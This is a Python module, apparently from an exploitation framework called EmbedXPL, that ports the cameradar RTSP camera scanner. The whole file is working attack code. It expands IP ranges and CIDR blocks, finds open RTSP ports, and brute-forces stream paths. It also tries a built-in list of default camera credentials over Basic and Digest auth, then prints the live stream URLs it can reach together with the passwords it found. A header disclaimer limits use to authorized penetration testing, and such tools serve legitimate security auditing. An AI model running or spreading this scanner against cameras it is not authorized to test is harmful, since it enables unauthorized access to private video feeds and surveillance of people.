"""RTSP Camera Scanner — Full brute-force engine (cameradar Python port).

Native Python RTSP scanner ported from cameradar (Go→Python).
Implements CIDR/IP/range/hostname target expansion, port discovery via raw
sockets (no nmap dependency), route dictionary brute-force, credential
brute-force, asyncio-powered parallel scanning, and device fingerprinting.

Original: https://github.com/Ullaakut/cameradar (MIT, Ullaakut)

Author: André Henrique (@mrhenrike) | União Geek
Version: 2.0.0
"""
# DISCLAIMER: FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
# Use only on systems you own or have explicit written permission to test.
# Authorized use only. See embedxpl.core.exploit.DISCLAIMER for full text.


from __future__ import annotations

import asyncio
import base64
import hashlib
import ipaddress
import logging
import re
import socket
import time
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Dict, List, Optional, Tuple

from embedxpl.core.exploit import *
from embedxpl.core.exploit.exploit import BaseExploit

logger = logging.getLogger(__name__)

# ── Embedded Route Dictionary (30+ common RTSP paths) ────────────────────────

RTSP_ROUTES: List[str] = [
    "/",
    "/live.sdp",
    "/live",
    "/live0.sdp",
    "/live1.sdp",
    "/live2.sdp",
    "/stream",
    "/stream1",
    "/stream2",
    "/stream0",
    "/cam",
    "/cam/realmonitor",
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cam0_0",
    "/ch0",
    "/ch0_0.h264",
    "/ch01.264",
    "/ch1",
    "/ch1/main/av_stream",
    "/h264",
    "/h264/ch1/main",
    "/h264/ch1/main/av_stream",
    "/h264/ch01/main/av_stream",
    "/h264/ch1/sub/av_stream",
    "/mpeg4",
    "/mpeg4/media.amp",
    "/mpeg4/1/media.amp",
    "/onvif1",
    "/onvif/device_service",
    "/MediaInput/h264",
    "/MediaInput/mpeg4",
    "/PSIA/streaming/channels/1",
    "/PSIA/streaming/channels/1/httppreview",
    "/PSIA/streaming/channels/2",
    "/axis-media/media.amp",
    "/video",
    "/video.h264",
    "/video1",
    "/video0",
    "/videoMain",
    "/av0_0",
    "/av0_1",
    "/profile1/media.smp",
    "/profile2/media.smp",
    "/Streaming/Channels/1",
    "/Streaming/Channels/2",
    "/Streaming/Channels/101",
    "/Streaming/Channels/201",
    "/trackID=1",
    "/11",
    "/12",
    "/media/video1",
    "/media/video2",
    "/media.amp",
    "/nphMpeg4/g726-640x",
    "/nphMpeg4/nil-",
    "/GetData.cgi",
    "/ISAPI/streaming/channels/1",
    "/ISAPI/streaming/channels/2",
]

# ── Embedded Credential Dictionary (20+ common pairs) ────────────────────────

RTSP_CREDENTIALS: List[Tuple[str, str]] = [
    ("", ""),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("admin", "9999"),
    ("admin", "1111"),
    ("root", ""),
    ("root", "root"),
    ("root", "12345"),
    ("root", "admin"),
    ("root", "pass"),
    ("root", "toor"),
    ("user", "user"),
    ("user", ""),
    ("guest", ""),
    ("guest", "guest"),
    ("supervisor", "supervisor"),
    ("operator", "operator"),
    ("service", "service"),
    ("support", "support"),
    ("ubnt", "ubnt"),
    ("ftp", "ftp"),
    ("tech", "tech"),
    ("888888", "888888"),
    ("666666", "666666"),
]

# ── Auth / fingerprint helpers ────────────────────────────────────────────────

class _AuthType(IntEnum):
    NONE = 0
    BASIC = 1
    DIGEST = 2


# Banner → device model fingerprinting map
_FINGERPRINTS: Dict[str, str] = {
    "hikvision": "Hikvision IP Camera",
    "dahua":     "Dahua IP Camera",
    "axis":      "AXIS Network Camera",
    "avigilon":  "Avigilon Camera",
    "bosch":     "Bosch IP Camera",
    "pelco":     "Pelco Camera",
    "vivotek":   "VIVOTEK Camera",
    "reolink":   "Reolink Camera",
    "foscam":    "Foscam Camera",
    "amcrest":   "Amcrest Camera",
    "uniview":   "Uniview Camera",
    "wisenet":   "Wisenet Camera",
    "hanwha":    "Hanwha Camera",
    "flir":      "FLIR Camera",
    "mobotix":   "MOBOTIX Camera",
    "geutebrück":"Geutebrück Camera",
    "panasonic": "Panasonic Camera",
    "sony":      "Sony Network Camera",
    "samsung":   "Samsung Techwin Camera",
    "honeywell": "Honeywell Camera",
    "rtsp":      "Generic RTSP Device",
    "live555":   "Live555 Media Server",
    "vxworks":   "VxWorks Embedded Device",
    "intelbras": "Intelbras Camera",
    "gst":       "GStreamer Media Server",
}


def _fingerprint_banner(banner: str) -> str:
    """Return device model from server banner using keyword match."""
    low = banner.lower()
    for key, model in _FINGERPRINTS.items():
        if key in low:
            return model
    return banner.strip() or "Unknown"


def _build_basic_auth(username: str, password: str) -> str:
    cred = f"{username}:{password}".encode()
    return "Basic " + base64.b64encode(cred).decode()


def _build_digest_auth(
    username: str,
    password: str,
    method: str,
    uri: str,
    realm: str,
    nonce: str,
) -> str:
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    resp = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    return (
        f'Digest username="{username}", realm="{realm}", '
        f'nonce="{nonce}", uri="{uri}", response="{resp}"'
    )


def _parse_www_auth(header: str) -> Tuple[_AuthType, str, str]:
    """Parse WWW-Authenticate header, return (auth_type, realm, nonce)."""
    if not header:
        return _AuthType.NONE, "", ""
    low = header.lower()
    if "digest" in low:
        realm_m = re.search(r'realm="([^"]*)"', header, re.I)
        nonce_m = re.search(r'nonce="([^"]*)"', header, re.I)
        realm = realm_m.group(1) if realm_m else ""
        nonce = nonce_m.group(1) if nonce_m else ""
        return _AuthType.DIGEST, realm, nonce
    if "basic" in low:
        realm_m = re.search(r'realm="([^"]*)"', header, re.I)
        realm = realm_m.group(1) if realm_m else ""
        return _AuthType.BASIC, realm, ""
    return _AuthType.NONE, "", ""


# ── Low-level RTSP over raw socket ───────────────────────────────────────────

def _raw_rtsp(
    host: str,
    port: int,
    request: str,
    timeout: float = 5.0,
) -> Optional[str]:
    """Send a raw RTSP request, return response text or None."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.sendall(request.encode("utf-8", errors="replace"))
        buf = b""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                sock.settimeout(max(0.1, deadline - time.monotonic()))
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                break
        sock.close()
        return buf.decode("utf-8", errors="replace")
    except Exception:
        return None


def _parse_rtsp_status(resp: str) -> int:
    """Extract status code from RTSP response line."""
    m = re.match(r"RTSP/\d\.\d\s+(\d+)", resp)
    return int(m.group(1)) if m else 0


def _parse_server_header(resp: str) -> str:
    m = re.search(r"^Server:\s*(.+)$", resp, re.IGNORECASE | re.MULTILINE)
    return m.group(1).strip() if m else ""


def _parse_www_authenticate(resp: str) -> str:
    m = re.search(r"^WWW-Authenticate:\s*(.+)$", resp, re.IGNORECASE | re.MULTILINE)
    return m.group(1).strip() if m else ""


# ── IP Target Expansion ───────────────────────────────────────────────────────

def _expand_target(target: str) -> List[str]:
    """Expand a target spec (CIDR, range, IP, hostname) to list of IPs."""
    target = target.strip()
    # CIDR
    try:
        net = ipaddress.ip_network(target, strict=False)
        return [str(ip) for ip in net.hosts()] or [str(net.network_address)]
    except ValueError:
        pass
    # Full IP range: x.x.x.x-y.y.y.y
    m = re.match(r'^(\d+\.\d+\.\d+\.\d+)-(\d+\.\d+\.\d+\.\d+)$', target)
    if m:
        try:
            s = int(ipaddress.IPv4Address(m.group(1)))
            e = int(ipaddress.IPv4Address(m.group(2)))
            return [str(ipaddress.IPv4Address(i)) for i in range(s, min(e + 1, s + 65536))]
        except Exception:
            pass
    # Octet range: 192.168.1-3.0-255
    if re.search(r'\d+-\d+', target) and target.count('.') == 3:
        parts = target.split('.')
        try:
            octets = []
            for p in parts:
                if '-' in p:
                    lo, hi = map(int, p.split('-', 1))
                    octets.append(range(lo, hi + 1))
                else:
                    octets.append(range(int(p), int(p) + 1))
            ips = []
            for a in octets[0]:
                for b in octets[1]:
                    for c in octets[2]:
                        for d in octets[3]:
                            ips.append(f"{a}.{b}.{c}.{d}")
            if ips:
                return ips
        except Exception:
            pass
    # Single IP
    try:
        ipaddress.IPv4Address(target)
        return [target]
    except ValueError:
        pass
    # Hostname
    try:
        infos = socket.getaddrinfo(target, None, socket.AF_INET)
        return list({i[4][0] for i in infos}) or [target]
    except socket.gaierror:
        pass
    return [target]


# ── Scan result dataclass ─────────────────────────────────────────────────────

@dataclass
class RtspScanResult:
    """Result of a single discovered RTSP stream."""
    host: str
    port: int
    url: str = ""
    credentials: Tuple[str, str] = ("", "")
    device_model: str = ""
    auth_method: str = "none"
    route: str = ""
    server_banner: str = ""
    accessible: bool = False


# ── Core Scanner Class ────────────────────────────────────────────────────────

class RtspScanner:
    """Native Python RTSP scanner.

    Ported from cameradar (https://github.com/Ullaakut/cameradar, MIT).
    Uses raw sockets + asyncio; no nmap dependency.

    Args:
        routes:      Override route list (defaults to embedded RTSP_ROUTES).
        credentials: Override credential pairs (defaults to embedded RTSP_CREDENTIALS).
        concurrency: Number of concurrent asyncio tasks.
        timeout:     Per-request socket timeout in seconds.
    """

    DEFAULT_PORTS: List[int] = [554, 5554, 8554, 322, 8322]

    def __init__(
        self,
        routes: Optional[List[str]] = None,
        credentials: Optional[List[Tuple[str, str]]] = None,
        concurrency: int = 50,
        timeout: float = 4.0,
    ) -> None:
        self.routes = routes if routes is not None else RTSP_ROUTES
        self.credentials = credentials if credentials is not None else RTSP_CREDENTIALS
        self.concurrency = concurrency
        self.timeout = timeout

    # ── Public API ────────────────────────────────────────────────────────────

    def scan_targets(
        self,
        targets: List[str],
        ports: Optional[List[int]] = None,
        timeout: Optional[float] = None,
    ) -> List[RtspScanResult]:
        """Scan a list of targets (IPs, CIDRs, hostnames) for open RTSP ports.

        Performs:
          1. Target expansion
          2. Port discovery via async socket scan
          3. Route brute-force for each open port
          4. Credential brute-force for authenticated routes

        Args:
            targets: List of IPs, CIDR blocks, ranges, or hostnames.
            ports:   RTSP ports to probe (default: 554, 5554, 8554, 322, 8322).
            timeout: Per-request timeout override.

        Returns:
            List of :class:`RtspScanResult` for accessible streams.
        """
        ports = ports or self.DEFAULT_PORTS
        if timeout is not None:
            self.timeout = timeout

        # Expand all targets
        all_ips: List[str] = []
        for t in targets:
            all_ips.extend(_expand_target(t))

        logger.info("[RtspScanner] Expanded %d IPs from %d targets", len(all_ips), len(targets))

        # Async pipeline
        loop = asyncio.new_event_loop()
        try:
            results = loop.run_until_complete(self._pipeline(all_ips, ports))
        finally:
            loop.close()
        return results

    def brute_route(
        self,
        host: str,
        port: int,
        timeout: Optional[float] = None,
    ) -> Optional[str]:
        """Brute-force RTSP route on a single host:port.

        Args:
            host:    IP address or hostname.
            port:    RTSP port.
            timeout: Socket timeout override.

        Returns:
            First working route string, or None if none found.
        """
        t = timeout or self.timeout
        # Test root first
        if self._probe_route(host, port, "/", t):
            return "/"
        for route in self.routes:
            r = route if route.startswith("/") else "/" + route
            if self._probe_route(host, port, r, t):
                return r
        return None

    def brute_credentials(
        self,
        host: str,
        port: int,
        route: str,
        timeout: Optional[float] = None,
    ) -> Optional[Tuple[str, str]]:
        """Brute-force credentials for a specific RTSP route.

        Args:
            host:    IP address or hostname.
            port:    RTSP port.
            route:   RTSP route path (e.g. "/live.sdp").
            timeout: Socket timeout override.

        Returns:
            Tuple (username, password) if found, else None.
        """
        t = timeout or self.timeout
        # First probe to detect auth type
        auth_type, realm, nonce = self._detect_auth(host, port, route, t)
        if auth_type == _AuthType.NONE:
            return ("", "")

        for username, password in self.credentials:
            if self._try_creds(host, port, route, username, password, auth_type, realm, nonce, t):
                return (username, password)
        return None

    # ── Async Pipeline ────────────────────────────────────────────────────────

    async def _pipeline(self, ips: List[str], ports: List[int]) -> List[RtspScanResult]:
        """Full async scan pipeline: port → route → creds."""
        sem = asyncio.Semaphore(self.concurrency)
        # Phase 1: port discovery
        open_pairs: List[Tuple[str, str]] = []  # (ip, port)

        async def _port_task(ip: str, port: int) -> Optional[Tuple[str, int]]:
            async with sem:
                loop = asyncio.get_event_loop()
                ok = await loop.run_in_executor(None, self._is_rtsp_port, ip, port)
                return (ip, port) if ok else None

        tasks = [_port_task(ip, port) for ip in ips for port in ports]
        for coro in asyncio.as_completed(tasks):
            result = await coro
            if result:
                open_pairs.append(result)

        logger.info("[RtspScanner] Phase 1: %d open RTSP ports", len(open_pairs))

        # Phase 2 + 3: route + credential brute-force
        results: List[RtspScanResult] = []

        async def _attack_task(ip: str, port: int) -> Optional[RtspScanResult]:
            async with sem:
                loop = asyncio.get_event_loop()
                return await loop.run_in_executor(None, self._attack, ip, port)

        atk_tasks = [_attack_task(ip, port) for ip, port in open_pairs]
        for coro in asyncio.as_completed(atk_tasks):
            r = await coro
            if r:
                results.append(r)

        return results

    # ── Per-host attack ───────────────────────────────────────────────────────

    def _is_rtsp_port(self, host: str, port: int) -> bool:
        """Return True if host:port responds to an RTSP OPTIONS."""
        req = f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: EmbedXPL/2.0\r\n\r\n"
        resp = _raw_rtsp(host, port, req, self.timeout)
        if not resp:
            return False
        return "RTSP/" in resp

    def _probe_route(self, host: str, port: int, route: str, timeout: float) -> bool:
        """Return True if the route does NOT give 404 (i.e., exists)."""
        r = route if route.startswith("/") else "/" + route
        req = (
            f"DESCRIBE rtsp://{host}:{port}{r} RTSP/1.0\r\n"
            f"CSeq: 2\r\n"
            f"User-Agent: EmbedXPL/2.0\r\n"
            f"Accept: application/sdp\r\n\r\n"
        )
        resp = _raw_rtsp(host, port, req, timeout)
        if not resp:
            return False
        status = _parse_rtsp_status(resp)
        # 200 = accessible, 401 = exists but needs auth, 403 = also exists
        return status in (200, 401, 403)

    def _detect_auth(
        self,
        host: str,
        port: int,
        route: str,
        timeout: float,
    ) -> Tuple[_AuthType, str, str]:
        """Probe route and detect authentication method."""
        r = route if route.startswith("/") else "/" + route
        req = (
            f"DESCRIBE rtsp://{host}:{port}{r} RTSP/1.0\r\n"
            f"CSeq: 3\r\n"
            f"User-Agent: EmbedXPL/2.0\r\n"
            f"Accept: application/sdp\r\n\r\n"
        )
        resp = _raw_rtsp(host, port, req, timeout)
        if not resp:
            return _AuthType.NONE, "", ""
        status = _parse_rtsp_status(resp)
        if status == 200:
            return _AuthType.NONE, "", ""
        www_auth = _parse_www_authenticate(resp)
        return _parse_www_auth(www_auth)

    def _try_creds(
        self,
        host: str,
        port: int,
        route: str,
        username: str,
        password: str,
        auth_type: _AuthType,
        realm: str,
        nonce: str,
        timeout: float,
    ) -> bool:
        """Try a username/password pair via Basic or Digest auth."""
        r = route if route.startswith("/") else "/" + route
        uri = f"rtsp://{host}:{port}{r}"
        if auth_type == _AuthType.BASIC:
            auth_header = _build_basic_auth(username, password)
        elif auth_type == _AuthType.DIGEST:
            auth_header = _build_digest_auth(username, password, "DESCRIBE", uri, realm, nonce)
        else:
            auth_header = ""

        req = (
            f"DESCRIBE {uri} RTSP/1.0\r\n"
            f"CSeq: 4\r\n"
            f"User-Agent: EmbedXPL/2.0\r\n"
            f"Accept: application/sdp\r\n"
        )
        if auth_header:
            req += f"Authorization: {auth_header}\r\n"
        req += "\r\n"

        resp = _raw_rtsp(host, port, req, timeout)
        if not resp:
            return False
        return _parse_rtsp_status(resp) == 200

    def _attack(self, host: str, port: int) -> Optional[RtspScanResult]:
        """Run route + credential attack on a single host:port."""
        # Get banner
        req = f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: EmbedXPL/2.0\r\n\r\n"
        options_resp = _raw_rtsp(host, port, req, self.timeout) or ""
        banner = _parse_server_header(options_resp)
        model = _fingerprint_banner(banner)

        # Route discovery
        route = self.brute_route(host, port)
        if not route:
            logger.debug("[RtspScanner] %s:%d — no valid route found", host, port)
            return None

        # Detect auth + brute credentials
        auth_type, realm, nonce = self._detect_auth(host, port, route, self.timeout)
        if auth_type == _AuthType.NONE:
            creds = ("", "")
            auth_str = "none"
        else:
            creds_found = self.brute_credentials(host, port, route)
            if not creds_found:
                # Still report the stream (route found but creds unknown)
                creds = ("", "")
                auth_str = auth_type.name.lower()
            else:
                creds = creds_found
                auth_str = auth_type.name.lower()

        # Build result URL
        r = route if route.startswith("/") else "/" + route
        if creds[0] or creds[1]:
            url = f"rtsp://{creds[0]}:{creds[1]}@{host}:{port}{r}"
        else:
            url = f"rtsp://{host}:{port}{r}"

        return RtspScanResult(
            host=host,
            port=port,
            url=url,
            credentials=creds,
            device_model=model,
            auth_method=auth_str,
            route=r,
            server_banner=banner,
            accessible=(auth_type == _AuthType.NONE or bool(creds[0] or creds[1])),
        )


# ── EmbedXPL Module Exploit class ─────────────────────────────────────────────

class Exploit(BaseExploit):
    """RTSP Camera Scanner — Full brute-force (cameradar Python port).

    Ported from cameradar (https://github.com/Ullaakut/cameradar, MIT).
    Uses raw sockets + asyncio; no nmap dependency required.

    Author: André Henrique (@mrhenrike) | União Geek
    Version: 2.0.0
    """

    __info__ = {
        "name": "RTSP Camera Scanner (cameradar port)",
        "description": (
            "Full native Python RTSP scanner ported from cameradar. Discovers RTSP "
            "cameras via raw socket port scan, brute-forces routes (30+ paths) and "
            "credentials (20+ pairs), fingerprints device models from banners. "
            "Async I/O for high-performance parallel scanning. No nmap required."
        ),
        "authors": (
            "Ullaakut (cameradar, Go original)",
            "André Henrique (@mrhenrike) — EmbedXPL Python port",
        ),
        "references": (
            "https://github.com/Ullaakut/cameradar",
        ),
        "devices": (
            "IP Cameras (RTSP)",
            "NVR / DVR Systems",
            "Hikvision, Dahua, AXIS, Bosch, Reolink, Intelbras, Generic",
        ),
    }

    target = OptIP("", "Target IP, CIDR, range, or hostname (comma-separated)")
    port = OptPort(554, "Primary RTSP port (0 = scan all defaults)")
    timeout = OptInteger(4, "Socket timeout per request (seconds)")
    concurrency = OptInteger(50, "Number of parallel scan workers")

    def _targets(self) -> List[str]:
        return [t.strip() for t in str(self.target).split(",") if t.strip()]

    def _ports(self) -> List[int]:
        p = int(self.port)
        if p == 0:
            return RtspScanner.DEFAULT_PORTS
        if p not in RtspScanner.DEFAULT_PORTS:
            return [p] + RtspScanner.DEFAULT_PORTS
        return RtspScanner.DEFAULT_PORTS

    def run(self) -> None:
        scanner = RtspScanner(
            timeout=float(self.timeout),
            concurrency=int(self.concurrency),
        )
        targets = self._targets()
        if not targets:
            print_error("No target specified. Set 'target' option.")
            return

        print_status(f"Scanning {len(targets)} target(s) on ports {self._ports()}")
        results = scanner.scan_targets(targets, ports=self._ports())

        if not results:
            print_status("No accessible RTSP streams found.")
            return

        print_success(f"Found {len(results)} accessible stream(s):")
        for r in results:
            print_success(f"  [{r.auth_method.upper()}] {r.url}")
            print_info(f"    Device : {r.device_model}")
            print_info(f"    Creds  : {r.credentials[0]!r}:{r.credentials[1]!r}")
            print_info(f"    Banner : {r.server_banner}")

    @mute
    def check(self) -> bool:
        targets = self._targets()
        if not targets:
            return False
        try:
            sock = socket.create_connection((targets[0], int(self.port)), timeout=3)
            sock.close()
            return True
        except Exception:
            return False

